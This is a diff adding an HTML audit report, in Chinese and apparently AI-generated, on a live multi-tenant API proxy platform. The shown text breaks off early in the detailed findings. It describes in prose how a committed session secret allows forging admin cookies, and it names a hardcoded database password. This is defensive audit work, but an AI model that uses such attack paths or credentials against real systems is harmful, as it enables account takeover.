@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>newapi628 线上要害专项审计报告</title>
+<style>
+  :root {
+    --sidebar-bg: #1a1f2e;
+    --sidebar-hover: #242a3d;
+    --sidebar-active: #2d3555;
+    --bg: #f0f3f7;
+    --card-bg: #ffffff;
+    --border: #e6eaef;
+    --text: #1e2233;
+    --text-secondary: #6b7394;
+    --accent: #3370ff;
+    --accent-light: #e8f0ff;
+    --success: #34c759;
+    --warning: #ff9500;
+    --danger: #ff3b30;
+    --info: #5ac8fa;
+    --badge-critical: #ff3b30;
+    --badge-high: #ff9500;
+    --badge-medium: #3370ff;
+    --badge-low: #8e8e93;
+    --badge-info: #5ac8fa;
+    --bar-bg: #e8eaed;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.8;
+    display: flex;
+    min-height: 100vh;
+    font-size: 15px;
+  }
+  .sidebar { width: 240px; background: var(--sidebar-bg); color: #fff; flex-shrink: 0; display: flex; flex-direction: column; position: sticky; top: 0; height: 100vh; overflow-y: auto; }
+  .sidebar-header { padding: 20px 20px 16px; border-bottom: 1px solid rgba(255,255,255,.06); }
+  .sidebar-header h1 { font-size: 18px; font-weight: 700; letter-spacing: .5px; }
+  .sidebar-header .sub { font-size: 12px; color: rgba(255,255,255,.4); margin-top: 4px; }
+  .sidebar-nav { padding: 8px 0; flex: 1; }
+  .sidebar-nav a { display: flex; align-items: center; gap: 12px; padding: 14px 20px; color: rgba(255,255,255,.6); text-decoration: none; font-size: 14px; transition: all .15s; border-left: 3px solid transparent; }
+  .sidebar-nav a:hover { background: var(--sidebar-hover); color: #fff; }
+  .sidebar-nav a.active { background: var(--sidebar-active); color: #fff; border-left-color: var(--accent); }
+  .sidebar-nav a .icon { width: 18px; text-align: center; font-size: 14px; }
+  .sidebar-footer { padding: 12px 20px; border-top: 1px solid rgba(255,255,255,.06); font-size: 11px; color: rgba(255,255,255,.3); }
+  .main { flex: 1; min-width: 0; padding: 32px 40px 80px; }
+  .page-header { margin-bottom: 32px; }
+  .page-header h2 { font-size: 26px; font-weight: 700; }
+  .page-header .meta { font-size: 14px; color: var(--text-secondary); margin-top: 6px; display: flex; gap: 20px; flex-wrap: wrap; }
+  .page-header .meta span { display: flex; align-items: center; gap: 4px; }
+  .card { background: var(--card-bg); border-radius: 10px; border: 1px solid var(--border); margin-bottom: 20px; overflow: hidden; }
+  .card-header { display: flex; align-items: center; justify-content: space-between; padding: 18px 24px; border-bottom: 1px solid var(--border); font-weight: 600; font-size: 15px; }
+  .card-body { padding: 24px; }
+  .score-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 12px; }
+  .score-item { display: flex; flex-direction: column; gap: 8px; padding: 18px 20px; background: #f8fafc; border-radius: 8px; border: 1px solid var(--border); }
+  .score-item .label { font-size: 13px; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; letter-spacing: .4px; }
+  .score-item .bar-row { display: flex; align-items: center; gap: 12px; }
+  .score-item .bar-track { flex: 1; height: 10px; background: var(--bar-bg); border-radius: 5px; overflow: hidden; }
+  .score-item .bar-fill { height: 100%; border-radius: 5px; transition: width .6s ease; }
+  .score-item .value { font-size: 22px; font-weight: 700; min-width: 52px; text-align: right; }
+  .score-item .grade { font-size: 15px; font-weight: 700; min-width: 22px; text-align: center; }
+  .bar-fill.s { background: linear-gradient(90deg, #34c759, #30d158); }
+  .bar-fill.a { background: linear-gradient(90deg, #3370ff, #5e8cff); }
+  .bar-fill.b { background: linear-gradient(90deg, #ff9500, #ffb340); }
+  .bar-fill.c { background: linear-gradient(90deg, #ff3b30, #ff6b61); }
+  .bar-fill.d { background: linear-gradient(90deg, #ff6b61, #ff9f91); }
+  .bar-fill.f { background: linear-gradient(90deg, #9b1d1a, #d63031); }
+  .grade-s { color: #34c759; } .grade-a { color: #3370ff; }
+  .grade-b { color: #ff9500; } .grade-c { color: #ff3b30; }
+  .grade-d { color: #ff6b61; } .grade-f { color: #9b1d1a; }
+  .overall-row { grid-column: 1 / -1; background: linear-gradient(135deg, #1a1f2e, #2d3555); border-color: transparent; }
+  .overall-row .label { color: rgba(255,255,255,.6); }
+  .overall-row .value { color: #fff; }
+  .overall-row .grade { color: #ff9500; }
+  .overall-row .bar-fill { background: linear-gradient(90deg, #ff9500, #ffb340); }
+  .stats-row { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 20px; }
+  .stat-card { flex: 1; min-width: 140px; padding: 20px 24px; background: var(--card-bg); border-radius: 10px; border: 1px solid var(--border); text-align: center; }
+  .stat-card .num { font-size: 32px; font-weight: 700; line-height: 1.3; }
+  .stat-card .desc { font-size: 13px; color: var(--text-secondary); margin-top: 4px; }
+  .finding { border-left: 4px solid var(--border); margin-bottom: 20px; padding: 20px 24px; border-radius: 0 10px 10px 0; background: #fafbfc; border: 1px solid var(--border); border-left-width: 4px; }
+  .finding.severity-critical { border-left-color: var(--badge-critical); }
+  .finding.severity-high { border-left-color: var(--badge-high); }
+  .finding.severity-medium { border-left-color: var(--badge-medium); }
+  .finding.severity-low { border-left-color: var(--badge-low); }
+  .finding.severity-info { border-left-color: var(--badge-info); }
+  .finding-header { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 8px; }
+  .finding-header h4 { font-size: 16px; font-weight: 600; flex: 1; }
+  .badge { display: inline-block; padding: 3px 12px; border-radius: 12px; font-size: 12px; font-weight: 600; line-height: 1.6; }
+  .badge-critical { background: #ffeae9; color: var(--badge-critical); }
+  .badge-high { background: #fff3e0; color: var(--badge-high); }
+  .badge-medium { background: var(--accent-light); color: var(--badge-medium); }
+  .badge-low { background: #f2f2f5; color: var(--badge-low); }
+  .badge-info { background: #e4f5ff; color: #007aff; }
+  .badge-confirmed { background: #e8ffe8; color: #248a3d; }
+  .badge-suspected { background: #fff8e1; color: #b8860b; }
+  .badge-s { background: #e8ffe8; color: #248a3d; }
+  .badge-a { background: var(--accent-light); color: var(--accent); }
+  .badge-b { background: #fff3e0; color: var(--warning); }
+  .badge-c { background: #ffeae9; color: var(--danger); }
+  .finding-meta { display: flex; gap: 16px; flex-wrap: wrap; font-size: 13px; color: var(--text-secondary); margin-bottom: 12px; }
+  .finding-meta span { display: flex; align-items: center; gap: 4px; }
+  .finding .evidence { margin: 12px 0; padding: 14px 18px; background: #f0f2f5; border-radius: 8px; font-family: "SF Mono","Fira Code","Consolas",monospace; font-size: 13px; line-height: 1.8; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+  .finding .problem { font-size: 14px; margin: 12px 0; color: var(--text); line-height: 1.8; }
+  .finding .fix-box { margin-top: 12px; padding: 14px 18px; background: #f0f7ff; border-radius: 8px; border: 1px solid #d6e4ff; font-size: 13px; }
+  .finding .fix-box code { display: block; margin-top: 6px; padding: 12px 16px; background: #1e2233; color: #cdd6f4; border-radius: 6px; font-family: "SF Mono","Fira Code","Consolas",monospace; font-size: 13px; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
+  .fix-label { font-weight: 600; font-size: 11px; color: var(--accent); text-transform: uppercase; letter-spacing: .3px; }
+  .section-title { font-size: 20px; font-weight: 700; margin: 36px 0 20px; padding-bottom: 10px; border-bottom: 2px solid var(--border); display: flex; align-items: center; gap: 8px; }
+  .table-wrap { overflow-x: auto; }
+  table { width: 100%; border-collapse: collapse; font-size: 14px; }
+  th { text-align: left; padding: 12px 16px; font-weight: 600; color: var(--text-secondary); font-size: 12px; text-transform: uppercase; letter-spacing: .4px; border-bottom: 2px solid var(--border); background: #f8fafc; }
+  td { padding: 12px 16px; border-bottom: 1px solid var(--border); }
+  tr:last-child td { border-bottom: none; }
+  .check-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 6px; }
+  .check-item { display: flex; align-items: center; gap: 10px; padding: 8px 12px; font-size: 14px; line-height: 1.6; }
+  .check-item .check { color: var(--success); font-weight: 700; }
+  .check-item .cross { color: var(--danger); font-weight: 700; }
+  .win-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 12px; }
+  .win-card { padding: 16px; background: linear-gradient(135deg, #f0f7ff, #e8f0ff); border-radius: 8px; border: 1px solid #d6e4ff; }
+  .win-card .win-title { font-weight: 600; font-size: 13px; margin-bottom: 4px; }
+  .win-card .win-meta { font-size: 11px; color: var(--text-secondary); }
+  .small { font-size: 13px; color: var(--text-secondary); }
+  .code-block { margin: 8px 0; padding: 14px 18px; background: #1e2233; color: #cdd6f4; border-radius: 6px; font-family: "SF Mono","Fira Code","Consolas",monospace; font-size: 13px; overflow-x: auto; white-space: pre; line-height: 1.7; }
+  .hl { color: #f7768e; font-weight: 600; } .cm { color: #565f89; }
+  .kw { color: #bb9af7; } .fn { color: #7aa2f7; }
+  .ty { color: #ff9e64; } .op { color: #89ddff; }
+  .str { color: #9ece6a; } .nu { color: #ff9e64; }
+  @media (max-width: 768px) { .sidebar { display: none; } .main { padding: 16px; } .score-grid { grid-template-columns: 1fr; } .stats-row { flex-direction: column; } .check-list { grid-template-columns: 1fr; } .win-grid { grid-template-columns: 1fr; } }
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: #c1c7d0; border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: #a8adb8; }
+</style>
+</head>
+<body>
+
+<nav class="sidebar">
+  <div class="sidebar-header">
+    <h1>newapi628</h1>
+    <div class="sub">线上要害专项审计 · 2026-07-14</div>
+  </div>
+  <div class="sidebar-nav">
+    <a href="#summary"><span class="icon">📊</span> 评分面板</a>
+    <a href="#executive-summary"><span class="icon">📝</span> 总体评估</a>
+    <a href="#coverage"><span class="icon">🧭</span> 覆盖矩阵</a>
+    <a href="#findings"><span class="icon">🔍</span> 详细发现</a>
+    <a href="#security"><span class="icon">🔒</span> 安全</a>
+    <a href="#stability"><span class="icon">⚡</span> 稳定性</a>
+    <a href="#performance"><span class="icon">🚀</span> 性能</a>
+    <a href="#configuration"><span class="icon">⚙️</span> 配置</a>
+    <a href="#observability"><span class="icon">🩺</span> 可观测性</a>
+    <a href="#fix-order"><span class="icon">🎯</span> 修复顺序</a>
+  </div>
+  <div class="sidebar-footer">Fuck My Shit Mountain v1.0</div>
+</nav>
+
+<div class="main">
+
+  <div class="page-header" id="summary">
+    <h2>newapi628 线上要害专项审计报告</h2>
+    <div class="meta">
+      <span>📅 2026-07-14</span>
+      <span>🔍 安全 · 稳定 · 性能 · 配置 · 可观测（含上次 33 条回归复核）</span>
+      <span>🛠 Claude Opus 4.8 · 主审计员 + 6 并行子审计员</span>
+      <span>📌 基线 d1783f9 · 源码 + 线上 newapi_test 只读实地取证</span>
+    </div>
+  </div>
+
+  <!-- 评分面板 -->
+  <div class="card">
+    <div class="card-header">📊 评分面板 <span class="small">（10 = 最好 / 0 = 屎山；本次为五模式专项，映射到 4 个评分维度，其余维度未评估）</span></div>
+    <div class="card-body">
+      <div class="score-grid">
+
+        <div class="score-item">
+          <div class="label">Security 安全</div>
+          <div class="bar-row">
+            <div class="bar-track"><div class="bar-fill c" style="width:45%"></div></div>
+            <span class="value grade-c">4.5</span>
+            <span class="grade grade-c">C</span>
+          </div>
+          <div class="small">1 Critical（git 提交的 session 密钥生产在用 → 认证绕过）+ 1 High（新页脚存储型 XSS）拖累；但核心租户隔离、支付验签、钱包幂等扎实。</div>
+        </div>
+
+        <div class="score-item">
+          <div class="label">Stability 稳定性</div>
+          <div class="bar-row">
+            <div class="bar-track"><div class="bar-fill b" style="width:60%"></div></div>
+            <span class="value grade-b">6.0</span>
+            <span class="grade grade-b">B</span>
+          </div>
+          <div class="small">1 High（付费代理套餐订单可永久孤儿）+ 对账无界/无告警；但钱路径核心 A 级，上次 High #1 已修。</div>
+        </div>
+
+        <div class="score-item">
+          <div class="label">Performance 性能</div>
+          <div class="bar-row">
+            <div class="bar-track"><div class="bar-fill b" style="width:60%"></div></div>
+            <span class="value grade-b">6.0</span>
+            <span class="grade grade-b">B</span>
+          </div>
+          <div class="small">计费写放大已修复且线上生效（BATCH/ASYNC 均 ON）；剩未缓存 tenant_id 读、breakage 全扫、连接池等 Medium；旧 31rps 基线需复测。</div>
+        </div>
+
+        <div class="score-item">
+          <div class="label">Release 发布运维</div>
+          <div class="bar-row">
+            <div class="bar-track"><div class="bar-fill c" style="width:35%"></div></div>
+            <span class="value grade-c">3.5</span>
+            <span class="grade grade-c">C</span>
+          </div>
+          <div class="small">Critical 密钥 + 生产安全护栏倒置 + 告警在生产被禁用 + 健康检查“狼来了” + nginx 死后端；有备份/回滚/CI 基建垫底。</div>
+        </div>
+
+        <div class="score-item overall-row">
+          <div class="label">Overall 总评</div>
+          <div class="bar-row">
+            <div class="bar-track" style="background:rgba(255,255,255,.12)"><div class="bar-fill" style="width:50%"></div></div>
+            <span class="value" style="color:#fff">5.0</span>
+            <span class="grade" style="color:#ff9500">B</span>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- 总体评估 -->
+  <h3 class="section-title" id="executive-summary">📝 总体评估</h3>
+  <div class="card">
+    <div class="card-header">📋 总体评估</div>
+    <div class="card-body">
+      <p><strong>项目概况：</strong> newapi628 是基于 New API（QuantumNous/new-api，Go + React）二次开发的<strong>多租户代理分销平台</strong>，已上线运营，有真实付费用户（微信/支付宝充值、tokenplan 套餐订阅、<code>/v1</code> API 转发按量计费、代理商分润与提现）。线上为单台 4 vCPU / 7.8 GB 服务器上的 Docker 三容器栈 <code>newapi_test</code>（app 监听 127.0.0.1:3100 + MySQL 8.2 + Redis），宝塔面板 + nginx 反代三域名，前置 Cloudflare。自研多租户层 <code>internal/</code> 约 5 万行 Go，前端约 40 页增量。本次为“线上要害专项”，覆盖<strong>安全、稳定、性能、配置、可观测</strong>五个审计面（映射到上方 Security / Stability / Performance / Release 四个评分维度），并逐条复核了上次 2026-07-09 审计的 33 条发现；结论以源码 + 服务器只读实地取证双重印证。</p>
+      <p style="margin-top:12px"><strong>主要风险：</strong> 集中在<strong>配置与运维发布层</strong>，而非业务代码。头号问题是<strong>会话/加密签名密钥是一段提交进 git 的内联默认值、且生产正在使用它</strong>（已用 sha256 比对坐实：容器运行值 == 仓库里 <code>docker-compose.test.yml</code> 的值）——任何能读仓库或镜像的人可伪造管理员会话、无凭据接管全平台。其次：新上线的“代理自配页脚”把未净化的 HTML 直接 <code>dangerouslySetInnerHTML</code>（存储型 XSS）；付费开通代理的订单在 slug 冲突时会“钱收了、代理没开、无对账、无告警”地永久孤儿；<strong>整套应用内告警在生产被禁用</strong>（支付卡单的 Critical 告警对象被静默丢弃），且对账循环每 5 分钟有 3 笔订阅失败、无人被通知；生产安全护栏 <code>guard_not_prod</code> 保护的是一个已删除的旧栈，导致“测试”脚本实际在对生产库执行破坏性操作。</p>
+      <p style="margin-top:12px"><strong>亮点（经独立验证，非泛泛而谈）：</strong> 钱路径核心工程质量是 A 级——充值/兑换/提现/套餐激活均<strong>幂等 + CAS 状态机 + 条件式不透支更新 + 同事务资金移动</strong>；支付回调用官方 SDK 验签、金额以数据库为准（前端无法篡改价）；多租户隔离纪律良好（自研 handler 一律用中间件校验过的 tenant_id、不信客户端传入）；无 SQL 注入、无 <code>os/exec</code>、无硬编码业务密钥、上传有双重类型校验；外部调用普遍有超时 + 有界退避重试。<strong>上次两条 High 均已确认修复</strong>（对账循环逐轮 recover、额度沉淀监控改读真实用量列），且一次合并语义互撞被单测当天拦下——CI 门确实生效。计费写放大（上次 Medium）也已修复<strong>并部署生效</strong>。</p>
+      <p style="margin-top:12px"><strong>优先修复：</strong> ①（当天）轮换并从 compose 移除 git 里的 <code>SESSION_SECRET</code>/<code>CRYPTO_SECRET</code>，改 <code>${VAR:?}</code> 强制注入；②（当天）后台开启 <code>breakage_alert_enabled</code> + 收件人，让支付告警真能发出；③（本周）修 <code>guard_not_prod</code> 指向真实生产栈、给破坏性脚本加确认门；④（本周）页脚渲染接入已打包的 DOMPurify；⑤（本周）AGT 订单购买时校验 slug + 补对账兜底/告警；⑥（本周）删 healthcheck.sh 里退役 auth-service 检查并接告警 webhook、修复 nginx 死后端。</p>
+      <p style="margin-top:12px"><strong>总评：5.0 / B（Fair，需要投入）。</strong> 需要说明方向：上次全维度审计 6.4，本次五维专项 5.0，<strong>并非项目质量退步</strong>——上次的 2 条 High 全部修好了，业务核心比上次更稳。分数下降是因为本次<strong>聚焦深挖了配置与可观测两个上次未深挖的面、并首次上服务器实地取证</strong>，挖出了一批只有在线上才看得见的要害（git 提交的密钥、生产禁用的告警、健康检查“狼来了”、nginx 死后端、订单孤儿）。这些绝大多数是<strong>部署配置层</strong>问题、多为小时级修复，不涉及代码架构重写。把这几处运维发布短板补齐，整体可迅速回到 A 区间。</p>
+    </div>
+  </div>
+
+  <!-- 覆盖矩阵 -->
+  <h3 class="section-title" id="coverage">🧭 覆盖矩阵</h3>
+  <div class="card">
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>维度</th><th style="width:110px">覆盖度</th><th>已检视证据</th><th>排除 / 局限</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>安全 Security</td>
+              <td><span class="badge badge-confirmed">High</span></td>
+              <td>全读 middleware/auth.go、router/mt-router.go、internal/mtwire/{agent_middleware,http,siteconfig,recharge,payment_inprocess,distribution}.go、siteconfig/policy.go、realpay/realpay.go、footer.tsx、use-tenant-brand.ts、main.go 会话配置；grep 全部 dangerouslySetInnerHTML(5)/DOMPurify/os.exec/SQLi 拼接/密钥默认；逐端点核对鉴权挂载；服务器只读验证密钥、端口暴露面。</td>
+              <td>New API 上游 relay/ 与原生 controller 仅当自研改动或产生新租户风险时报；2FA/OAuth 上游流程、moderation 绕过深链未逐行；生产 .env 仅做布尔比对不读值。</td>
+            </tr>
+            <tr>
+              <td>稳定性 Stability</td>
+              <td><span class="badge badge-confirmed">High</span></td>
+              <td>全读钱路径与全部后台 loop：reconcile/loop_safe/breakage_snapshot/agent_plan_expiry/billing_writer/recharge/subscription_bridge/sub_reconcile/agent_plan_bridge、payment/{credit,reconcile}、wallet/agent gormrepo；49 处 go func 清点；类型断言/panic/超时/信号；线上查 SUB/AGT 订单状态分布 + reconcile heartbeat。</td>
+              <td>未在运行时制造真实失败回调（Mac 只读）；siteconfig/tenant/ticket/stats 的 repo 以 grep+抽读为主；relay 上游 goroutine 作边界。</td>
+            </tr>
+            <tr>
+              <td>性能 Performance</td>
+              <td><span class="badge badge-confirmed">High</span></td>
+              <td>全程追踪 /v1 计费热路径（service/{quota,text_quota,billing,funding_source}、model/{user,channel,token,log}、mtwire hooks、agent gormrepo）；核对 BATCH_UPDATE/ASYNC gating 与 git 时间线；量了 dist/ 前端块体积；线上取 MySQL 变量（buffer pool / flush / 连接数 / 命中率）+ /api/status 运行时开关。</td>
+              <td>线上 slow_query_log=OFF，索引建议为静态分析（无生产慢日志佐证）；ON 配置下无新压测，吞吐上限标 Suspected 需复测；image/audio/mjproxy relay 变体未深挖（文本为核心流量）。</td>
+            </tr>
+            <tr>
+              <td>配置 Configuration</td>
+              <td><span class="badge badge-confirmed">High</span></td>
+              <td>全读 deploy/docker-compose.test.yml、.env.test.example、deploy/ops/*.sh、deploy/nginx/*.conf、根 compose、Dockerfile*、makefile；Go 侧 common/{init,env,crypto}.go、wire.go、cors.go；线上只读：容器 env 键名、行为开关值、MySQL 运行参数、live nginx vhost、host 监听。</td>
+              <td>Cloudflare 侧（SSL 模式 / WAF / 安全头 / 规则）我方不可见——若干 nginx 发现的爆炸半径取决于它；上游连接池/relay 超时旋钮未逐项枚举（留上游默认）。</td>
+            </tr>
+            <tr>
+              <td>可观测性 Observability</td>
+              <td><span class="badge badge-confirmed">High</span></td>
+              <td>全读 internal/alert/*、reconcile 循环+heartbeat+history+HTTP、breakage repo/loop、健康端点+路由、支付回调+入账日志点、compose+ops 脚本；线上：docker inspect（健康检查/日志驱动/重启数）、DB heartbeat、告警配置、容器日志采样、磁盘、crontab。</td>
+              <td>wallet/tokenplan/risk/moderation 的信号密度以 grep 计数 + 抽读；未在运行时触发失败回调；Redis 持久化/淘汰作边界。</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-body">
+      <p class="small"><strong>取证说明：</strong> 检视范围 = 自研 <code>internal/</code>（22 包）+ controller/middleware/model/service/router 中多租户·计费·支付·风控部分 + auth-service + deploy + web/default 前端要点。默认排除：<code>.git</code>、node_modules/dist、生成物、上游 New API 未改动基线（仅作边界，产生新租户/新失败模式时才报）、二进制资产（bulb-orbit 2MB 单文件按纪律不整读）。线上取证全部为<strong>只读命令</strong>（cat/grep/docker inspect/printenv/只读 SQL/curl 本地），未对服务器做任何写、改、删、重启、部署操作；所有密钥/口令/PII 一律脱敏为 <code>&lt;redacted&gt;</code>，仅以路径 + 键名 + 风险描述呈现。</p>
+    </div>
+  </div>
+
+  <!-- 统计 -->
+  <div class="stats-row">
+    <div class="stat-card"><div class="num">39</div><div class="desc">总发现</div></div>
+    <div class="stat-card"><div class="num" style="color:var(--badge-critical)">1</div><div class="desc">Critical</div></div>
+    <div class="stat-card"><div class="num" style="color:var(--badge-high)">5</div><div class="desc">High</div></div>
+    <div class="stat-card"><div class="num" style="color:var(--badge-medium)">16</div><div class="desc">Medium</div></div>
+    <div class="stat-card"><div class="num" style="color:var(--badge-low)">16</div><div class="desc">Low</div></div>
+    <div class="stat-card"><div class="num" style="color:var(--badge-info)">1</div><div class="desc">Info</div></div>
+  </div>
+  <div class="card">
+    <div class="card-body">
+      <p class="small"><strong>上次（2026-07-09）33 条回归复核结论：</strong> <span style="color:var(--success);font-weight:600">已修复 11 条</span>（含两条 High 全修）· <span style="color:var(--warning);font-weight:600">部分修复 3 条</span> · <span style="color:var(--danger);font-weight:600">未修复 19 条</span>（其中 High 0 / Medium 3 / Low 12 / Info 4）· 已失效 0 条。修复投入明显集中在 High/Medium 后端资金与稳定性；Low/Info 速赢清单基本未动。发现一次 #2×#8 修复合并语义互撞，被单测当天拦下并回修（84be730）——正面信号，CI 门有效。本报告 39 条中包含少量仍值得修的历史遗留（已注明来源）。</p>
+    </div>
+  </div>
+
+  <!-- Top Risks -->
+  <h3 class="section-title" id="top-risks">⚠️ 主要风险清单（Top 12）</h3>
+  <div class="card">
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th style="width:50px">#</th><th>发现</th><th style="width:100px">严重程度</th><th style="width:120px">维度</th></tr></thead>
+          <tbody>
+            <tr><td>1</td><td>会话/加密签名密钥是 git 提交的内联默认值，生产正在使用 → 可伪造管理员会话、无凭据接管平台</td><td><span class="badge badge-critical">Critical</span></td><td>安全 / 发布</td></tr>
+            <tr><td>2</td><td>新上线“代理自配页脚”未净化 HTML 经 dangerouslySetInnerHTML 渲染 → 存储型 XSS</td><td><span class="badge badge-high">High</span></td><td>安全</td></tr>
+            <tr><td>3</td><td>付费开通代理订单在 slug 冲突时永久孤儿：钱收了、代理没开、无对账、无告警</td><td><span class="badge badge-high">High</span></td><td>稳定性</td></tr>
+            <tr><td>4</td><td>生产安全护栏 guard_not_prod 保护已删除旧栈，“测试”脚本实际对生产库执行破坏性操作</td><td><span class="badge badge-high">High</span></td><td>发布 / 稳定</td></tr>
+            <tr><td>5</td><td>整套应用内告警在生产被禁用 → 支付卡单等 Critical 告警对象被静默丢弃</td><td><span class="badge badge-high">High</span></td><td>可观测 / 稳定</td></tr>
+            <tr><td>6</td><td>对账循环停摆/失败无主动告警（线上实证：每 5 分钟 3 笔订阅对账失败、零通知）</td><td><span class="badge badge-high">High</span></td><td>可观测 / 稳定</td></tr>
+            <tr><td>7</td><td>MySQL root 密码 testpass123 硬编码提交进 compose（缓解：DB 未对公网暴露）</td><td><span class="badge badge-medium">Medium</span></td><td>配置 / 安全</td></tr>
+            <tr><td>8</td><td>线上 nginx 仍指向已死后端（退役 auth-service:8180 + 已删 :3000 栈）→ 502 / 从 repo 恢复即重引死路由</td><td><span class="badge badge-medium">Medium</span></td><td>配置</td></tr>
+            <tr><td>9</td><td>healthcheck.sh 每次探测退役 auth-service 必失败 2 项 → “狼来了”掩盖真故障，且无告警 webhook</td><td><span class="badge badge-medium">Medium</span></td><td>配置 / 可观测</td></tr>
+            <tr><td>10</td><td>SUB 订阅卡单对账无 LIMIT + pending 永不过期 → 随废单累积劣化、打爆商户查单 API、拖垮对账</td><td><span class="badge badge-medium">Medium</span></td><td>稳定 / 性能</td></tr>
+            <tr><td>11</td><td>RISK_DEFAULT_RPM=60 线上在跑、与文档“应为 0”矛盾，每次部署静默重施（每用户限 ~1 req/s）</td><td><span class="badge badge-medium">Medium</span></td><td>配置</td></tr>
+            <tr><td>12</td><td>支付成功入账 / 金额篡改拒绝均不记日志；Creem 路径明文记录 PII</td><td><span class="badge badge-medium">Medium</span></td><td>可观测 / 安全</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- 详细发现（展开 Critical + High） -->
+  <h3 class="section-title" id="findings">🔍 详细发现（Critical + High 完整展开）</h3>
+  <p class="small" style="margin:-8px 0 16px">以下 6 条 Critical/High 逐条给出证据、失败场景、最小修复、回归测试与工作量；Medium 及以下按维度归入下方各维度小节的表格。所有发现均标注 Confirmed（读代码/线上坐实）或 Suspected（模式推断）。</p>
+
+  <!-- C1 -->
+  <div class="finding severity-critical">
+    <div class="finding-header">
+      <h4>1. 会话/加密签名密钥是 git 提交的内联默认值，生产正在使用 → 管理员会话伪造</h4>
+      <span class="badge badge-critical">Critical</span>
+      <span class="badge badge-confirmed">Confirmed</span>
+    </div>
+    <div class="finding-meta">
+      <span>📁 安全 / 发布（配置）</span>
+      <span>📍 deploy/docker-compose.test.yml:17 · common/init.go:49-63 · main.go:191</span>
+      <span>🎯 会话签名 + 加密 HMAC 密钥</span>
+    </div>
+    <div class="problem">
+      <strong>问题：</strong> 会话签名密钥 <code>SESSION_SECRET</code>（以及派生的加密 HMAC 密钥 <code>CRYPTO_SECRET</code>）在生产环境使用的值，是一段<strong>写死在 <code>docker-compose.test.yml</code> 里、随仓库提交进 git 的 48 字符十六进制默认值</strong>。服务器 <code>.env</code> 没有设置该键，于是 compose 的内联默认 <code>${SESSION_SECRET:-4329…}</code> 生效。<code>common/init.go:49-63</code> 仅在密钥等于<em>上游</em>占位符 <code>"random_string"</code> 时才 fatal，这段提交的 hex 直接通过、无任何警告。<code>CRYPTO_SECRET</code> 未设 → fallback 为同一值，所以会话签名与 <code>GenerateHMAC</code>（token 缓存、文件服务）共用这把公开的钥匙。
+    </div>
+    <div class="evidence">主审计员线上验证（脱敏，仅比对不读值）：
+• 容器 newapi_test-app-1 printenv SESSION_SECRET → 长度 48
+• sha256(容器运行值) == sha256(compose 内联默认值)  ***MATCH***
+• 服务器 .env 键清单：AUTH_SIGN_SECRET / MT_INTERNAL_SECRET / MT_SITE_IP / UPSTREAM_*  —— 无 SESSION_SECRET、无 CRYPTO_SECRET
+• /api/status 进程自报正常，未触发 init.go 的 random_string fatal
+证据链：main.go:191 cookie.NewStore([]byte(SessionSecret)) → controller/user.go:138-141 签名 cookie 携带 id/username/role/status</div>
+    <div class="problem" style="margin-top:4px">
+      <strong>攻击路径：</strong> 攻击者读取仓库中的 <code>docker-compose.test.yml</code>（或从镜像中提取），用已知密钥离线构造一个 <code>role=100</code>（root）、<code>id</code> 任意的合法签名会话 cookie，直接以站点管理员身份通过真实域名登录——无需凭据、无需任何 CVE。全租户/用户/计费接管；同一把已知密钥还可伪造任意 <code>GenerateHMAC</code> 输出。<strong>攻击前提</strong>：能读到仓库或容器镜像（协作者、CI、镜像分发、任何一次源码泄漏）。
+    </div>
+    <div class="fix-box">
+      <div class="fix-label">最小修复（当天 · 需轮换）</div>
+      <code>1) compose 改为强制注入：SESSION_SECRET: "${SESSION_SECRET:?must be set}"
+2) 生成新的强随机 SESSION_SECRET 与独立 CRYPTO_SECRET，仅写入服务器 .env（权限 600）
+3) 立即轮换（当前值已烧毁）并使现有会话失效（用户需重新登录）
+4) 加固 common/init.go：拒绝空值 / 含 "change-me" / 长度或熵不足的密钥，不止拦 "random_string"
+5) CI 增加 grep 门：禁止任何 docker-compose*.yml 出现非 ${...} 的内联密钥字面量</code>
+    </div>
+    <div class="fix-box" style="margin-top:6px;background:#fff8e1;border-color:#ffe082">
+      <strong>⏱ 工作量：</strong> 1–2 小时（改动 + 轮换 + 重部署；唯一用户可见影响是强制重新登录） &nbsp;·&nbsp; <strong>回归测试：</strong> 启动集成测试断言 <code>SESSION_SECRET</code> 为空时进程非零退出；CI grep 门在 compose 出现内联密钥时失败。
+    </div>
+  </div>
+
+  <!-- H: footer XSS -->
+  <div class="finding severity-high">
+    <div class="finding-header">
+      <h4>2. 代理自配页脚未净化 HTML 经 dangerouslySetInnerHTML 渲染 → 存储型 XSS</h4>
+      <span class="badge badge-high">High</span>
+      <span class="badge badge-confirmed">Confirmed</span>
+    </div>
+    <div class="finding-meta">
+      <span>📁 安全</span>
+      <span>📍 web/default/src/components/layout/components/footer.tsx:236 · internal/siteconfig/policy.go:33-47</span>
+      <span>🎯 OEM 站点品牌 / 租户页脚（最新提交 d1783f9）</span>
+    </div>
+    <div class="problem">
